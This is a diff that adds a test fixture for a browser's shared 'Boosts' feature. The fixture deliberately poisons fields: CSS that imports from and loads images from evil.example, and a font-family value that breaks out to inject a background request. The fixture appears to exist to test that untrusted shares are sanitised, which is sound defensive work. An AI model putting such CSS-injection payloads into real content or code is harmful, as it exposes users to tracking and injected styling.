@@ -86,3 +86,36 @@ async function cleanupSpaces(keepUuid) {
     "no split groups should survive cleanup"
   );
 }
+
+const { gZenBoostsManager } = ChromeUtils.importESModule(
+  "resource:///modules/zen/boosts/ZenBoostsManager.sys.mjs"
+);
+
+const BOOST_DOMAIN = "example.com";
+
+// A hostile share: every field that can carry a request or break out of the
+// CSS it is interpolated into is poisoned.
+const BOOST_DOC = {
+  version: "1",
+  shared: {
+    type: "boost",
+    name: "Shared Boost",
+    domain: BOOST_DOMAIN,
+    author: "John Zen",
+    icon: "data:image/png;base64,iVBORw0KGgo=",
+    preview: "data:image/jpeg;base64,/9j/4AAQ",
+    signature: { viewBox: "0 0 100 50", paths: ["M1 1 L2 2"] },
+    boostData: {
+      boostName: "Ignored",
+      customCSS:
+        "@import url(https://evil.example/x.css); " +
+        "body { background: url(https://evil.example/t.png); color: red; }",
+      fontFamily: "Arial; background: url(https://evil.example/f)",
+      textCaseOverride: "blink",
+      zapSelectors: [".ad", { not: "a string" }],
+      dotPos: { x: 0.2, y: "nope", extra: 1 },
+      sizeOverride: "big",
+      smartInvert: true,
+    },
+  },
+};
